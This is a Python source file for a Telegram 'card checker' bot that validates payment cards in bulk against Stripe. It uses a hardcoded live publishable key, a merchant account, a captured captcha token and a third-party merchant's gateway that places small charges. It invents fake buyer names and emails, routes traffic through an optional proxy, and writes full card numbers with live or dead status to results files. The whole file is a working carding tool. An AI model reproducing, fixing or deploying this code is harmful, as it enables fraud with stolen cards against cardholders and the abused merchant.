import requests, re, random, string, json, time, sys, threading
import os
from datetime import datetime
from flask import Flask, jsonify
import telebot
from telebot import types

# ===== CONFIGURATION =====
P_URL = "" 

# Get bot token from environment variable
BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
if not BOT_TOKEN:
    print("❌ ERROR: TELEGRAM_BOT_TOKEN environment variable not set!")
    print("💡 Set it in Render dashboard: Environment → Add Environment Variable")
    BOT_TOKEN = ""

# ===== FLASK WEB SERVER (for Render keep-alive) =====
app = Flask(__name__)

@app.route('/')
def home():
    return jsonify({
        "status": "online",
        "service": "telegram-card-checker",
        "bot": "running",
        "timestamp": datetime.now().isoformat()
    })

@app.route('/health')
def health():
    return jsonify({"status": "healthy"}), 200

@app.route('/ping')
def ping():
    return "pong", 200

# ===== NEW CARD CHECKING CORE MECHANICS =====
class CardChecker:
    def __init__(self):
        self.session = requests.Session()
        if P_URL:
            self.session.proxies = {'http': P_URL, 'https': P_URL}
        
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 15; moto g15 Build/VVTA35.51-137) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7444.171 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
        })
    
    def get_str(self, string: str, start: str, end: str) -> str:
        """Extract substring between start and end markers."""
        try:
            parts = string.split(start, 1)
            if len(parts) > 1:
                return parts[1].split(end, 1)[0]
        except:
            pass
        return ""
    
    def format_year(self, year: str) -> str:
        """Format year to two-digit format."""
        year_mapping = {
            "2030": "30", "2031": "31", "2032": "32", "2033": "33",
            "2021": "21", "2022": "22", "2023": "23", "2024": "24",
            "2025": "25", "2026": "26", "2027": "27", "2028": "28",
            "2029": "29"
        }
        return year_mapping.get(year, year[-2:] if year else "")
    
    def generate_random_name(self) -> tuple:
        """Generate random Brazilian name."""
        names = [
            ['marcos', 'rodrigues'], ['abreu', 'vieira'], ['murilo', 'castro'], ['diego', 'oliveira'],
            ['alberto', 'gomes'], ['dario', 'almeida'], ['micael', 'andrade'], ['rodrigo', 'barros'],
            ['marlon', 'borges'], ['silva', 'campos'], ['Abrahao', 'cardoso'], ['Abade', 'carvalho'],
            ['francisco', 'costa'], ['alan', 'dias'], ['ronaldo', 'dantas'], ['marinho', 'duarte'],
            ['Abelardo', 'santos'], ['magal', 'freitas'], ['lemos', 'fernandes'], ['thales', 'ferreira'],
            ['tiago', 'garcia'], ['Diniz', 'goalves'], ['luiz', 'lima'], ['heitor', 'lopes'],
            ['leandro', 'machado'], ['arthur', 'marques'], ['david', 'bernardo'], ['juan', 'martins'],
            ['diogo', 'medeiros'], ['caue', 'melo'], ['joaquin', 'mendes'], ['isaac', 'miranda'],
            ['carlos', 'monteiro'], ['andre', 'moraes'], ['marrone', 'neves'], ['ian', 'moreira'],
        ]
        random_name = random.choice(names)
        return random_name[0].capitalize(), random_name[1].capitalize()
    
    def generate_email(self, first_name: str, last_name: str) -> str:
        """Generate random email."""
        return f"{first_name.lower()}{last_name.lower()}{random.randint(100, 9999)}@gmail.com"
    
    def check_card(self, cc, mm, yy, cvv):
        """Check a single card using the new mechanics"""
        try:
            # Clean card number (remove spaces)
            cc = cc.replace(' ', '')
            
            # Clean expiration
            if len(mm) == 1:
                mm = f"0{mm}"
            if len(yy) == 2:
                yy = f"20{yy}"
            
            # Format year
            formatted_year = self.format_year(yy)
            
            # Generate random user data
            first_name, last_name = self.generate_random_name()
            email = self.generate_email(first_name, last_name)
            
            headers_stripe = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 15; moto g15 Build/VVTA35.51-137) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7444.171 Mobile Safari/537.36',
                'Accept': 'application/json',
                'Content-Type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
            }
            
            headers_auxilia = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 15; moto g15 Build/VVTA35.51-137) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7444.171 Mobile Safari/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/json',
            }
            
            hcaptcha_token = "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZSI6MCwiZXhwIjoxNzY1MTY4MzE3LCJjZGF0YSI6ImNNVTdjL1I5UStLbVFKV3VHV1Yxb2M4SXBCMW4xcFdCZThNUHlEdUlNSnQyaFU3V0EvWnBzSTAxbUpLZ2RqQmhESGlkU2ttbXhnSFM2bjNqOFdRbnJwekVTQWdVeithNlFXSzE0VlljTkttUy9OTkkyZjhmZjY2bnlCVHFiWXF1TGx5ZklZYmtyWUlrMXlmQVgzdUdlWEtmVVZ3bUs3L2NtQ3pCTHhURElEU0ZEQlFGUk9JWjI1QUxxY21hS1U1bDJESFRGMjA5M0JFb2ZqNUMiLCJwYXNza2V5IjoiSFpNVFlVU2VFN3FGOHp1amptVjR1RzdaVjBrMFM5WE1TcVFvRTY4RHF1ckFBVVZBKzBsTHBEVkFEdnQxZG1vMFgzSDJTV1MyTDJub0c3cUdRN0l5cmp4MW9CREJFS0doblRCNHNZbS9jVkZyOGo1aGFWc1AvYlprcGlja3RIRUNxUk51akJZWWV6dURxUlVPVFlMYzZTZ2tnaTlrOXZzYVVyU1lNekpzSTJnSWNUcHk2dnBEOHJrMml1T2pmUlhzbFR5TllmOXhxOGt5dXpRamczRzlTTnF3WE1USnYzUnpiK25HWVIvQ3BnL1ZuTnEwNTdzS0dYT3Y1dWFsQzJCSFI3K3dWVnIrVlpCVHJlbjBSRGREQkN4a1ZsM1VadElFaFZtc3g0dUprYVhuRzdqeVhuTXVjM2thRzV3ejd5WEREVG4xUzF6eG9JNE1sellGeTZJMkJVVWd1QWY4bUd2WUo4UDdxRjdNMFBhbk50cG5sM0MzenFnUDNKSHRUVlErQmJYNmU1ZXduRFRBaHpEK3NnVEhXU3RrdlRUQStyNzdVbWxTQXFPODRsdGk2TysxYUVvMWpUTFBTbFJaUFBFWUw3UTZmY2tvK3VpSmRsTVl0QUJ4eEJQeUtHRFYxK3AyU0ZSWkxVSnB5cEtjcEZXNi90SmVCd0V2UDVLSzc3N2RmZ09yVTM3NXBrVTlmQXRPMlRqSXRJZjRJcGYwWTlmT3ZGdzdJSTY3cDdsTis1MjdhSjl3SmFRRDU5Q25qdmZKbklHTVpOc2M1R2RxRzR4Z0pqOW0xM3JoamRuZnFTMHozSDUyUmFzZDJiK25NN1YvemgwdmFibEo4ZjkvemZiQ1VpUlQ1cjVDUDcxeUxXVVlMeDNvbUZVdlQ4QmEwQTNRM28yRCt1VVNadjl2Z0EzeWg0MmtmMGRhUUFoWGt4ejNLOWVCRm1XWEVac0VGak5RMU8rRW9Pck1xWGlnRmV0UkVFQStRbll2OVNiY3ZublppM2w0UWJUMGFYOGJpc2hmR1R6WmRRTHNidDNIL0VGcDNnTGgvMUdONmxXVW0vR2JtQmw2ZTEzMnNIeE82NHQwSzZCR1RVc0tUOFI5ZU5wU3h3VmkwbThuQlZPOThrTHE5S0tXVmJwa0VNM0Z1eDVaVFlyVmcyUTdjYUFleGRSOTFDczRHMU56UUVyL0NZWUtlTnZub3B6QUNVVjZmalBOeDlJODNsQ3ZLWHgzNjBBOU9LeExkQWM5V0NHUmJIK1pPeEwyTHFkV2V3UDZpUyt3ajZlcWMrWHo5L0oxOVNMNWhGMHBvVnJwMHcyai9XbW5JTkNpWk5pbkp6MWtXTUhoNWxzY2gzN2lNQ3lseC84N0RRb0FucHA2WmZrR1FWYjZEWHF6enBaVEpuckVNa3NOZlE4WlMxTmh1TnJsUFVWTW82c3ZKbW80dmpYZ3RnN2Jrc1ZjeXg2SjhUSVdiQW5ZYzFFU1lFcG5RRGgvSDBNTmhSTnlCSGNudUlBUWZXOCsrQ2JxSWVUb25EY2JhUzJrV05jZEE2QzZsSTY0VGVScGVnTUNyYzJ5d0g5by9DaXpNaU5BVmlOM0IzSGQzZ0toY2IvZUUybzY3SzE4ZzFxdlBKbzhqcC9rNEVOZ0xkZFJWSXFaYTd5MHp3SmZlQVRpZTFNWU52TzlBdW9NNHBIWXhGVlJ3cXlBSyszYlI3KzI4a0o2WEZrQkcxS0VwUmhJa1hHUWh1RzRVdkhVVWNGQTAyWUx0MTZ1a1J4VWpWcXJncGkyK0JUNWRiVkhuZ003T2o1OW5ZbUw1bzRHWVVXU0NqbzhhNXZsaDF6cjF0MDhuNFJuQ3Q0eW45eGwranZEMjQ4U1dGTFdIOUxlOVRwREZzQmU1T3ZUeUxIcTBtemhuWTViVUNiUXZoaWxjWlE5TDBFY2xlYTY2M3YyRHRBcWtLZU14T2t5NDdrbGlZZGtDZ3dYdS9BTURVNUpRdndURHpOaVhaNVRNMWdQUStCRStkSU5McWlVMkw0c3NsRGRweUVYS21vV0FnWFo1amkrVDlFeWJZb0JldnZ6bVg5NDB3ZkRLL0thYm4xWVY2VkZYRGhKMnhraHVhV2hXbGhxa1dmT2pSdFJCZUpmc21iUUdVdjBUcUR0R3RWVjlya1Rua25Tem41a0dTZHh3V1BCak1qMTBKU25WOGZITWY4ZDZMbUJZQWxHVnZrcXhMV3NRVjQ0c2xtU0tkSWpNOUY1VVorNWJFYXdpTjRBTDNNUkdXMVdSZ3lXa0ZjbVNNdkowRXd5eWd5TFk4L0JJRVJOeTVzRmxmb1lGVXl5SC9FV2JRcFlnemdXR251Q1BEMCtCUVBhbWRCVkkxMFZKSmdQZmtDUkdGWC9SR0h4VHI1aW5ud3VYRVA3MHBId1NDdEZzRW5QTEd6SE9FL2p3cE9FaWsxelB2Ui8ySGJETC82c1dUeVZMZXFRYVhMc0o4OXBDNk1JSXFid2ZhSTJ3TXRtNGcvb0ZDNnFTQnRrdndFQzU4SUVIcXhDUkZqL0dDYUNubFBsT1BtTVJwUkI1QjFhZUQ4NEZsZk5xV2lvalpQSTFxZnJWQmt5UkNlS211MVdWVTFEYmNacXQ1NDQ3TXdNV00zd2hjOGNsRkE9Iiwia3IiOiIzN2Y3N2FmYyIsInNoYXJkX2lkIjo3MTc3MTUzN30.-V-0_gZVA7F0tmV140yPxGp0s1biNTsFG6ACn1uQyUU"
            
            # Step 1: Create payment method
            post_data1 = f"type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={formatted_year}&guid=5d319c85-6154-4dbd-bce8-7f2e6aaa139e9076ee&muid=3c91e096-1757-4928-a91b-904da3a9b8e7bbf6ca&sid=3d879f8a-122c-454a-9e7f-969c91b42fa13fc2fc&payment_user_agent=stripe.js%2F9390d43c1d%3B+stripe-js-v3%2F9390d43c1d%3B+split-card-element&referrer=https%3A%2F%2Fapp.theauxilia.com&time_on_page=214019&client_attribution_metadata[client_session_id]=6c9975d6-d147-4662-a3e8-7954aba80f3b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51JExFOBmd3aFvcZgZ4ObBfLAlSW1hTefXW3iTMlexRmlClSjS6SvAAcOV4AOebLfcEptsRpLPzEzo18rl3WQZl4U00PJU9Kk2K&_stripe_account=acct_1OUaY9PWD3UOxDVR&radar_options[hcaptcha_token]={hcaptcha_token}"
            
            r1 = self.session.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers_stripe,
                data=post_data1,
                timeout=15
            )
            result1 = r1.text
            payment_id = self.get_str(result1, '"id": "', '"')
            
            if not payment_id:
                return "card_error", "Failed to get payment ID"
            
            # Step 2: Initialize payment
            payload2 = {
                "email": email,
                "clientID": "b189cf6a-7911-4f9f-a8c6-a5115105dec2",
                "ammount": 5.48,
                "paymentMethod": payment_id
            }
            
            r2 = self.session.post(
                'https://app-production-gateway-api.politeisland-fa948fee.eastus2.azurecontainerapps.io/Merchant/InitializePayment',
                headers=headers_auxilia,
                json=payload2,
                timeout=15
            )
            result2 = r2.text
            token2 = self.get_str(result2, '"token":"', '"')
            token1 = self.get_str(result2, '"token":"', '_s')
            
            if not token1 or not token2:
                return "card_error", "Failed to get payment tokens"
            
            # Step 3: Confirm setup intent
            post_data3 = f"expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51JExFOBmd3aFvcZgZ4ObBfLAlSW1hTefXW3iTMlexRmlClSjS6SvAAcOV4AOebLfcEptsRpLPzEzo18rl3WQZl4U00PJU9Kk2K&_stripe_account=acct_1OUaY9PWD3UOxDVR&client_attribution_metadata[client_session_id]=6c9975d6-d147-4662-a3e8-7954aba80f3b&client_attribution_metadata[merchant_integration_source]=l1&client_secret={token2}"
            
            r3 = self.session.post(
                f'https://api.stripe.com/v1/setup_intents/{token1}/confirm',
                headers=headers_stripe,
                data=post_data3,
                timeout=15
            )
            result3 = r3.text
            
            # Parse response and map to status
            if "Your card's security code is incorrect." in result3:
                return "✅", "INVALID_CVC - Card is live but CVC wrong"
            elif "Your card has expired." in result3:
                return "✅", "EXPIRED_CARD - Card was valid"
            elif "generic_decline" in result3:
                return "❌", "Generic decline - Card dead"
            elif "do_not_honor" in result3:
                return "❌", "Do not honor - Card dead"
            elif "card number is incomplete." in result3:
                return "❌", "Incomplete card - Invalid format"
            elif "Your card does not support this type of purchase." in result3:
                return "❌", "Purchase not supported - Card dead"
            elif 'incorrect_number' in result3:
                return "❌", "Invalid card number - Card dead"
            elif 'Unrecognized request URL' in result3:
                return "⚠️", "API error - Try again"
            elif 'succeeded' in result3:
                return "✅", "Charged 5.48 R$ - Card live"
            else:
                return "⚠️", "Unknown response - Check manually"
                
        except requests.exceptions.Timeout:
            return "⚠️", "Timeout - Network issue"
        except requests.exceptions.ConnectionError:
            return "⚠️", "Connection error - Network issue"
        except Exception as e:
            return "⚠️", f"Error: {str(e)[:50]}"

# ===== STYLISH FORMATTING FUNCTIONS (KEEPING YOUR EXACT UI) =====
def create_progress_bar(percentage, width=15):
    """Create a compact progress bar"""
    filled = int(width * percentage / 100)
    empty = width - filled
    return "█" * filled + "░" * empty

def format_time(seconds):
    """Format seconds into compact time"""
    if seconds < 60:
        return f"{int(seconds)}s"
    elif seconds < 3600:
        mins = int(seconds // 60)
        secs = int(seconds % 60)
        return f"{mins}m {secs}s"
    else:
        hours = int(seconds // 3600)
        mins = int((seconds % 3600) // 60)
        return f"{hours}h {mins}m"

def get_status_info(result_code, result_message):
    """Get appropriate emoji and descriptive message for status"""
    # Simplified mapping based on result code
    if result_code == "✅":
        if "INVALID_CVC" in result_message:
            return "✅", "Live - Invalid CVC"
        elif "EXPIRED_CARD" in result_message:
            return "✅", "Live - Expired"
        elif "Charged" in result_message:
            return "✅", "Live - Charged"
        else:
            return "✅", "Live - " + result_message
    elif result_code == "❌":
        if "Generic decline" in result_message:
            return "❌", "Dead - Generic decline"
        elif "Do not honor" in result_message:
            return "❌", "Dead - Do not honor"
        elif "Incomplete" in result_message:
            return "❌", "Dead - Invalid format"
        elif "Purchase not supported" in result_message:
            return "❌", "Dead - Not supported"
        elif "Invalid card number" in result_message:
            return "❌", "Dead - Invalid number"
        else:
            return "❌", "Dead - " + result_message
    else:  # ⚠️
        if "Timeout" in result_message:
            return "⚠️", "Error - Timeout"
        elif "Connection error" in result_message:
            return "⚠️", "Error - Connection"
        elif "API error" in result_message:
            return "⚠️", "Error - API"
        else:
            return "⚠️", "Error - " + result_message

def mask_card(card_number):
    """Mask card number compactly"""
    if len(card_number) >= 10:
        return f"{card_number[:6]}***{card_number[-4:]}"
    return card_number

# ===== TELEGRAM BOT =====
# Global storage (KEEPING YOUR EXACT STRUCTURE)
checking_processes = {}
results_data = {}
card_checker = CardChecker()

# Initialize bot
if BOT_TOKEN:
    bot = telebot.TeleBot(BOT_TOKEN, parse_mode='Markdown')
else:
    bot = None

def process_single_card(card_line, message_id=None):
    """Process a single card - USING NEW MECHANICS"""
    if not card_line.strip():
        return "❌ Empty line"
    
    try:
        sp = card_line.strip().split('|')
        if len(sp) < 4:
            return f"❌ Format error"
        
        cc, mm, yy, cvv = sp[0], sp[1], sp[2], sp[3]
        
        # Check card using new mechanics
        result_code, result_message = card_checker.check_card(cc, mm, yy, cvv)
        
        # Get emoji and description
        emoji, description = get_status_info(result_code, result_message)
        
        # Determine status for counters
        is_approved = emoji == "✅"
        is_decline = emoji == "❌"
        is_error = emoji == "⚠️"
        
        return {
            'card': cc,
            'exp': f"{mm}/{yy}",
            'result': result_message,
            'emoji': emoji,
            'description': description,
            'masked': mask_card(cc),
            'is_decline': is_decline,
            'is_error': is_error,
            'is_approved': is_approved,
            'short_desc': description.split(' - ')[0] if ' - ' in description else description
        }
    except Exception as e:
        return {
            'card': card_line.split('|')[0] if '|' in card_line else "Unknown",
            'exp': "??/??",
            'result': str(e),
            'emoji': "⚠️",
            'description': f"Error: {str(e)[:50]}",
            'masked': "****",
            'is_decline': False,
            'is_error': True,
            'is_approved': False,
            'short_desc': "Error"
        }

def process_file_mass_check(filename, message_id, user_id, chat_id):
    """Process cards from file with progress updates - ORIGINAL UI"""
    try:
        with open(filename, 'r') as f:
            lines = [line.strip() for line in f if line.strip()]
        
        total = len(lines)
        if total == 0:
            return "empty"
        
        # Initialize check data (KEEPING YOUR EXACT STRUCTURE)
        check_id = f"check_{user_id}_{int(time.time())}"
        checking_processes[check_id] = {
            'user_id': user_id,
            'chat_id': chat_id,
            'total': total,
            'current': 0,
            'completed': 0,
            'start_time': time.time(),
            'running': True,
            'results': [],
            'progress_msg_id': None,
            'stop_button_msg_id': None,
            'last_update_time': time.time()
        }
        
        results_data[check_id] = {
            'approved': 0,
            'declined': 0,
            'error': 0,
            'cards': []
        }
        
        # Send initial progress message
        send_progress_update(check_id, initial=True)
        
        # Process cards ONE BY ONE
        for i, card_line in enumerate(lines, 1):
            if not checking_processes[check_id]['running']:
                break
            
            checking_processes[check_id]['current'] = i
            
            # Process card
            result = process_single_card(card_line, message_id)
            
            checking_processes[check_id]['completed'] = i
            
            if isinstance(result, dict):
                checking_processes[check_id]['results'].append(result)
                
                # Update stats
                if result['is_approved']:
                    results_data[check_id]['approved'] += 1
                elif result['is_decline']:
                    results_data[check_id]['declined'] += 1
                elif result['is_error']:
                    results_data[check_id]['error'] += 1
                
                results_data[check_id]['cards'].append(result)
            
            # UPDATE AFTER EACH CARD with live counters
            send_progress_update(check_id)
            
            # Small delay between cards
            time.sleep(1.5)
        
        # Send final report
        if check_id in checking_processes and checking_processes[check_id]['running']:
            send_final_report(check_id)
        
        return check_id
        
    except Exception as e:
        return f"error: {str(e)}"

def send_progress_update(check_id, initial=False):
    """Send progress update to user - ORIGINAL UI WITH LIVE COUNTERS"""
    if check_id not in checking_processes or not bot:
        return
    
    check = checking_processes[check_id]
    total = check['total']
    completed = check['completed']
    results = results_data.get(check_id, {})
    
    # Throttle updates (minimum 0.5 seconds between updates)
    current_time = time.time()
    if not initial and current_time - check.get('last_update_time', 0) < 0.5:
        return
    
    checking_processes[check_id]['last_update_time'] = current_time
    
    # Calculate progress
    progress_percent = 0 if total == 0 else int((completed / total) * 100)
    progress_bar = create_progress_bar(progress_percent)
    
    # Calculate time
    elapsed_time = time.time() - check['start_time']
    elapsed_str = format_time(elapsed_time)
    
    # Calculate ETA if we have data
    eta_str = ""
    if completed > 0 and completed < total:
        time_per_card = elapsed_time / completed
        remaining_cards = total - completed
        eta_seconds = time_per_card * remaining_cards
        eta_str = f" • ETA: `{format_time(eta_seconds)}`"
    
    # ===== LIVE COUNTERS =====
    live_counters = ""
    if results:
        approved = results.get('approved', 0)
        declined = results.get('declined', 0)
        errors = results.get('error', 0)
        
        # Calculate success rate
        success_rate = int((approved / completed * 100)) if completed > 0 else 0
        
        live_counters = (
            f"\n\n*LIVE COUNTERS:*\n"
            f"✅ `{approved}` Live\n"
            f"❌ `{declined}` Dead\n"
            f"⚠️ `{errors}` Errors\n"
            f"`{success_rate}%` Success Rate"
        )
    
    # ===== RECENT CARDS (last 3) =====
    recent_cards = ""
    if len(check['results']) > 1:
        recent_cards = "\n\n*Recent:*\n"
        # Show last 3 cards processed
        for result in check['results'][-3:]:
            if isinstance(result, dict):
                recent_cards += f"`{result['masked']}` {result['emoji']} {result['short_desc']}\n"
    
    # ===== LAST CARD DETAILS =====
    last_card_info = ""
    if check['results']:
        last_result = check['results'][-1]
        if isinstance(last_result, dict):
            last_card_info = f"\n\n*Last Checked:*\n`{last_result['masked']}` {last_result['emoji']} {last_result['short_desc']}"
    
    # Create complete message (ORIGINAL FORMAT)
    message = (
        f"*MASS CHECK IN PROGRESS*\n"
        f"`{progress_bar}` {progress_percent}%\n"
        f"`{completed}/{total}` cards • `{elapsed_str}`{eta_str}"
        f"{live_counters}"
        f"{last_card_info}"
        f"{recent_cards}"
    )
    
    # Create inline keyboard with stop button
    keyboard = types.InlineKeyboardMarkup()
    stop_button = types.InlineKeyboardButton(text="🛑 STOP CHECK", callback_data=f"stop_{check_id}")
    keyboard.add(stop_button)
    
    try:
        # Update progress message
        if check['progress_msg_id']:
            bot.edit_message_text(
                chat_id=check['chat_id'],
                message_id=check['progress_msg_id'],
                text=message,
                parse_mode='Markdown',
                reply_markup=keyboard
            )
        else:
            msg = bot.send_message(
                chat_id=check['chat_id'],
                text=message,
                parse_mode='Markdown',
                reply_markup=keyboard
            )
            checking_processes[check_id]['progress_msg_id'] = msg.message_id
            checking_processes[check_id]['stop_button_msg_id'] = msg.message_id
    except:
        pass

def send_final_report(check_id):
    """Send final report and results file to user - ORIGINAL UI"""
    if check_id not in checking_processes or check_id not in results_data or not bot:
        return
    
    check = checking_processes[check_id]
    results = results_data[check_id]
    
    elapsed_time = time.time() - check['start_time']
    elapsed_str = format_time(elapsed_time)
    total_cards = len(results['cards'])
    
    # Save results file
    results_file = save_results_file(check_id)
    
    # Calculate success rate
    success_rate = int((results['approved'] / total_cards * 100)) if total_cards > 0 else 0
    
    # Create summary WITH PROPER EMOJIS
    summary = (
        f"*CHECK COMPLETE*\n"
        f"`{total_cards}` cards • `{elapsed_str}`\n"
        f"`{success_rate}%` success rate\n\n"
        f"✅ `{results['approved']}` Live\n"
        f"❌ `{results['declined']}` Dead\n"
        f"⚠️ `{results['error']}` Errors\n\n"
    )
    
    # Add recent results with proper emojis
    if results['cards']:
        summary += "*Recent Results:*\n"
        for card in results['cards'][-5:]:
            summary += f"`{card['masked']}` {card['emoji']} {card['short_desc']}\n"
    
    # Send summary
    bot.send_message(
        chat_id=check['chat_id'],
        text=summary,
        parse_mode='Markdown'
    )
    
    # Send results file
    if os.path.exists(results_file):
        with open(results_file, 'rb') as f:
            bot.send_document(
                chat_id=check['chat_id'],
                document=f,
                caption=f"Results: {check_id}",
                visible_file_name=f"results_{check_id}.txt"
            )
    
    # Clean up
    if check_id in checking_processes:
        del checking_processes[check_id]

def save_results_file(check_id):
    """Save results to a file - ORIGINAL FORMAT"""
    if check_id not in results_data:
        return None
    
    results = results_data[check_id]
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"results_{check_id}.txt"
    
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"CHECK RESULTS - {timestamp}\n")
            f.write(f"ID: {check_id}\n")
            f.write("=" * 60 + "\n")
            f.write(f"TOTAL CARDS: {len(results['cards'])}\n")
            f.write(f"✅ LIVE: {results['approved']}\n")
            f.write(f"❌ DEAD: {results['declined']}\n")
            f.write(f"⚠️ ERRORS: {results['error']}\n")
            f.write(f"SUCCESS RATE: {int((results['approved'] / len(results['cards']) * 100)) if results['cards'] else 0}%\n")
            f.write("=" * 60 + "\n\n")
            f.write("DETAILED RESULTS:\n")
            f.write("-" * 60 + "\n")
            
            for i, card in enumerate(results['cards'], 1):
                status_text = "LIVE" if card['is_approved'] else "DEAD" if card['is_decline'] else "ERROR"
                f.write(f"{i:03d}. {card['emoji']} {card['card']}|{card['exp']}|{status_text}|{card['description']}\n")
        
        return filename
    except Exception as e:
        print(f"Error saving results: {e}")
        return None

# ===== BOT COMMAND HANDLERS (KEEPING YOUR EXACT COMMANDS) =====
if bot:
    @bot.message_handler(commands=['start', 'help'])
    def send_welcome(message):
        welcome_text = (
            "*CARD CHECKER BOT*\n\n"
            "*Commands:*\n"
            "• /check CC|MM|YY|CVV\n"
            "• Send .txt file for mass check\n"
            "• /status - Show active checks\n\n"
            "*Format:* CC|MM|YY|CVV"
        )
        bot.reply_to(message, welcome_text, parse_mode='Markdown')

    @bot.message_handler(commands=['check'])
    def check_single_card(message):
        """Handle single card check"""
        try:
            parts = message.text.split(' ', 1)
            if len(parts) < 2:
                bot.reply_to(message, "*Format:* `/check CC|MM|YY|CVV`")
                return
            
            card_line = parts[1].strip()
            
            # Process card
            result = process_single_card(card_line, message.message_id)
            
            if isinstance(result, dict):
                response = (
                    f"*CARD CHECK*\n"
                    f"`{result['masked']}`\n"
                    f"*Status:* {result['emoji']} {result['description']}"
                )
            else:
                response = f"*ERROR*\n{result}"
            
            bot.reply_to(message, response, parse_mode='Markdown')
            
        except Exception as e:
            bot.reply_to(message, f"*ERROR*\n`{str(e)}`")

    @bot.message_handler(commands=['status'])
    def show_status(message):
        """Show active checks"""
        user_id = message.from_user.id
        active_checks = []
        
        for check_id, check in checking_processes.items():
            if check['user_id'] == user_id and check['running']:
                progress = 0 if check['total'] == 0 else int((check['completed'] / check['total']) * 100)
                progress_bar = create_progress_bar(progress, 10)
                elapsed = format_time(time.time() - check['start_time'])
                
                # Get live counters for this check
                results = results_data.get(check_id, {})
                approved = results.get('approved', 0)
                declined = results.get('declined', 0)
                errors = results.get('error', 0)
                
                active_checks.append(
                    f"*{check_id}*\n"
                    f"`{progress_bar}` {progress}%\n"
                    f"`{check['completed']}/{check['total']}` • `{elapsed}`\n"
                    f"✅ `{approved}` ❌ `{declined}` ⚠️ `{errors}`"
                )
        
        if active_checks:
            response = "*ACTIVE CHECKS*\n\n" + "\n".join(active_checks)
        else:
            response = "*NO ACTIVE CHECKS*"
        
        bot.reply_to(message, response, parse_mode='Markdown')

    @bot.message_handler(func=lambda m: True, content_types=['document'])
    def handle_document(message):
        """Handle file uploads"""
        try:
            if not message.document.file_name.endswith('.txt'):
                bot.reply_to(message, "*Send .txt file only*")
                return
            
            # Download file
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            
            # Save temporarily
            filename = f"temp_{message.from_user.id}_{int(time.time())}.txt"
            with open(filename, 'wb') as f:
                f.write(downloaded_file)
            
            # Send initial message
            init_msg = bot.reply_to(message, "*Processing file...*")
            
            # Start mass check
            def run_mass_check():
                check_id = process_file_mass_check(
                    filename, 
                    message.message_id, 
                    message.from_user.id,
                    message.chat.id
                )
                
                if check_id == "empty":
                    bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=init_msg.message_id,
                        text="*FILE EMPTY*"
                    )
                elif check_id.startswith("error:"):
                    bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=init_msg.message_id,
                        text=f"*ERROR*\n`{check_id[6:]}`"
                    )
                
                # Clean up
                try:
                    os.remove(filename)
                except:
                    pass
            
            # Start thread
            thread = threading.Thread(target=run_mass_check)
            thread.start()
            
        except Exception as e:
            bot.reply_to(message, f"*ERROR*\n`{str(e)}`")

    @bot.callback_query_handler(func=lambda call: call.data.startswith('stop_'))
    def handle_stop_button(call):
        """Handle stop button callback"""
        try:
            check_id = call.data.split('_', 1)[1]
            
            if check_id in checking_processes:
                if checking_processes[check_id]['user_id'] == call.from_user.id:
                    checking_processes[check_id]['running'] = False
                    
                    # Save partial results
                    if check_id in results_data:
                        results_file = save_results_file(check_id)
                        
                        # Send partial results
                        check = checking_processes[check_id]
                        completed = check['completed']
                        total = check['total']
                        results = results_data[check_id]
                        
                        summary = (
                            f"*CHECK STOPPED*\n"
                            f"`{completed}/{total}` cards processed\n\n"
                            f"✅ `{results['approved']}` Live\n"
                            f"❌ `{results['declined']}` Dead\n"
                            f"⚠️ `{results['error']}` Errors"
                        )
                        
                        bot.send_message(
                            chat_id=call.message.chat.id,
                            text=summary,
                            parse_mode='Markdown'
                        )
                        
                        # Send partial results file
                        if results_file and os.path.exists(results_file):
                            with open(results_file, 'rb') as f:
                                bot.send_document(
                                    chat_id=call.message.chat.id,
                                    document=f,
                                    caption=f"Partial Results: {check_id}",
                                    visible_file_name=f"partial_{check_id}.txt"
                                )
                    
                    # Remove stop button and update message
                    try:
                        bot.edit_message_reply_markup(
                            chat_id=call.message.chat.id,
                            message_id=call.message.message_id,
                            reply_markup=None
                        )
                        
                        bot.edit_message_text(
                            chat_id=call.message.chat.id,
                            message_id=call.message.message_id,
                            text=f"*STOPPED*\n`{check_id}`",
                            parse_mode='Markdown'
                        )
                    except:
                        pass
                    
                    # Clean up
                    if check_id in checking_processes:
                        del checking_processes[check_id]
                    
                    bot.answer_callback_query(call.id, "Check stopped")
                else:
                    bot.answer_callback_query(call.id, "Not your check")
            else:
                bot.answer_callback_query(call.id, "Check not found")
                
        except Exception as e:
            bot.answer_callback_query(call.id, f"Error: {str(e)}")

    @bot.message_handler(func=lambda message: True)
    def handle_text(message):
        """Handle text messages"""
        text = message.text.strip()
        
        if '|' in text and len(text.split('|')) >= 3:
            result = process_single_card(text, message.message_id)
            
            if isinstance(result, dict):
                response = (
                    f"*CARD CHECK*\n"
                    f"`{result['masked']}`\n"
                    f"*Status:* {result['emoji']} {result['description']}"
                )
            else:
                response = f"*ERROR*\n{result}"
            
            bot.reply_to(message, response, parse_mode='Markdown')
        else:
            bot.reply_to(message, 
                "*Send card:* CC|MM|YY|CVV\n"
                "*Or send .txt file*",
                parse_mode='Markdown'
            )

# ===== FLASK ROUTES FOR WEB SERVER =====
def run_flask_server():
    """Run Flask web server on specified port"""
    port = int(os.getenv('PORT', 10000))
    print(f"🌐 Starting Flask server on port {port}...")
